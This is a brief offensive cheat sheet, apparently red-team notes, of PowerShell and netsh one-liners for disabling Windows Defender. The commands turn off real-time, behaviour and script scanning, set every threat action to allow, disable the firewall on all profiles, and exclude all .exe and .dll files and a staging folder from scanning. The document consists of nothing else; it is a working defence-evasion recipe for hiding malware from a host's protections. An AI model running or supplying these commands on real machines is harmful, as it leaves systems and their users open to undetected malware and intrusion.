# Defender

### Turn off Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true;
Set-MpPreference -DisableBehaviorMonitoring $true;
Set-MpPreference -DisableIOAVProtection $true;
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true;
Set-MpPreference -DisableArchiveScanning $true;
Set-MpPreference -DisableIntrusionPreventionSystem $true;
Set-MpPreference -SubmitSamplesConsent 2;
Set-MpPreference -HighThreatDefaultAction 6 -Force;
Set-MpPreference -ModerateThreatDefaultAction 6;
Set-MpPreference -LowThreatDefaultAction 6;
Set-MpPreference -SevereThreatDefaultAction 6;

netsh advfirewall set allprofiles state off;

Add-MpPreference -ExclusionExtension ".exe";
Add-MpPreference -ExclusionProcess "regsvr32";
Add-MpPreference -ExclusionProcess ".exe";
Add-MpPreference -ExclusionProcess "iexplorer.exe";
Add-MpPreference -ExclusionProcess "explorer.exe";
Add-MpPreference -ExclusionProcess ".dll";
Add-MpPreference -ExclusionProcess "*.dll";
Add-MpPreference -ExclusionProcess "*.exe"

Set-MpPreference -MAPSReporting 0;
Set-MpPreference -PUAProtection disable;
Set-MpPreference -EnableControlledFolderAccess Disabled;
```



```powershell
# disable
powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'

# Or exclude
powershell -command 'Add-MpPreference -ExclusionPath "c:\temp" -ExclusionProcess "c:\temp\yourstuffs.exe"'

```
